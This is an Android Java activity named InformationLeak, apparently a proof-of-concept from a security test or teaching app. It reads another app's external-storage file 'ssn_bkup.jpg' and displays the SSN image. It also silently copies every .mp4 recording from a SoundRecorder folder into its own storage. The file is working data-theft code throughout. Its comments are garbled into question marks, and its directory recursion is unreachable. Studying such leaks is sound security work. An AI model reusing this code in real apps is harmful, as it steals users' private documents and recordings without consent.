package com.example.ask.ui.storage;

import android.app.Activity;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.ImageView;
import android.widget.TextView;


import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.example.ask.R;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

public class InformationLeak extends Activity {

    public static int REQ_CODE = 101;
    private static final String TAG = "ExternalStorageMal";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.storage_information_leak);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (checkPermission("android.permission.READ_EXTERNAL_STORAGE", android.os.Process.myPid(), android.os.Process.myUid()) == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "android.permission.READ_EXTERNAL_STORAGE already granted");
            performAction();
            String oldPath = Environment.getExternalStorageDirectory().getAbsolutePath()+"/SoundRecorder/";
            //String newPath = myPath.replace("com.example.ask", "com.danielkim.soundrecorder");
            File file = new File(getExternalFilesDir(null), "SoundRecorder");
            String absPath = file.getAbsolutePath();
            //String newPath=
            readUDiskDevsList(oldPath, absPath);
        } else {
            Log.d(TAG, "need android.permission.READ_EXTERNAL_STORAGE permission");
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_EXTERNAL_STORAGE"}, REQ_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int reqCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (reqCode == REQ_CODE && permissions[0].equals("android.permission.READ_EXTERNAL_STORAGE")
                && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            performAction();

        } else {
            throw new RuntimeException(new SecurityException());
        }
    }

    private void performAction() {
        ImageView imageView = (ImageView) findViewById(R.id.imageView);
        TextView result = (TextView) findViewById(R.id.result);
        File file = new File(getExternalFilesDir(null), "ssn_bkup.jpg");
        String absPath = file.getAbsolutePath();
        String path = absPath.replace("com.example.ask", "com.example.externalstorage");
        Log.d(TAG, path);
        Bitmap image = BitmapFactory.decodeFile(path);
        if (image != null) {
            result.setText("ImageView loaded with SSN");
        } else {
            result.setText("Unable to load image");
        }
        imageView.setImageBitmap(image);
    }

    public void readUDiskDevsList(String oldPath, String newPath) {
        try {
            (new File(newPath)).mkdirs(); //???????????????????????? ?????????????????????
            File a = new File(oldPath);
            String[] file = a.list();
            File temp = null;
            //???????????????????????????
            for (int i = 0; i < file.length; i++) {
                if (oldPath.endsWith(File.separator)) {
                    temp = new File(oldPath + file[i]);
                } else {
                    temp = new File(oldPath + File.separator + file[i]);
                }

                if (temp.isFile() && temp.getName().endsWith(".mp4")) {   //?????????MP4??????
                    //??????????????????
                    FileInputStream input = new FileInputStream(temp);
                    FileOutputStream output = new FileOutputStream(newPath + "/" +
                            (temp.getName()).toString());
                    Log.d(TAG, "readUDiskDevsList: " + temp.getName() + "????????????");
                    //??????????????????
                    byte[] b = new byte[1024 * 5];
                    //???????????????
                    int len;
                    while ((len = input.read(b)) != -1) {
                        //???b?????????????????????FileOutputStream?????????
                        output.write(b, 0, len);
                    }
                    //?????????
                    output.flush();
                    output.close();
                    input.close();

                    if (temp.isDirectory()) {//?????????????????????
                        readUDiskDevsList(oldPath + "/" + file[i], newPath + "/" + file[i]);
                    }
                }
            }
        } catch (Exception e) {
            System.out.println("???????????????????????????????????????");
            e.printStackTrace();
        }
    }
}
